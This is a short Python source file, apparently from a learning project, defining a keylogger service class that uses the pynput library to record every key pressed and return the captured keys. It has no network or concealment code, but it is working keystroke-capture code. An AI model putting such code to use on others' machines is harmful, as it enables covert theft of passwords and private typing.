from pynput import keyboard
from interfaces.IkeyLogger import Ikeylogger

# פונקציה להתחחלת הפעולה עם התוכנית סוף הפעולה וקבלת המידע
class Keyloggerservice(Ikeylogger):
    def __init__(self):
        self.logged_keys = []
        self.listener = None

    def on_press(self, key):
        try:
            self.logged_keys.append(key.char)
        except AttributeError:
            self.logged_keys.append(str(key))

    def start_logging(self):
        self.logged_keys = []
        self.listener = keyboard.Listener(on_press = self.on_press)
        self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()
            self.listener = None

    def get_logged_keys(self):
        return self.logged_keys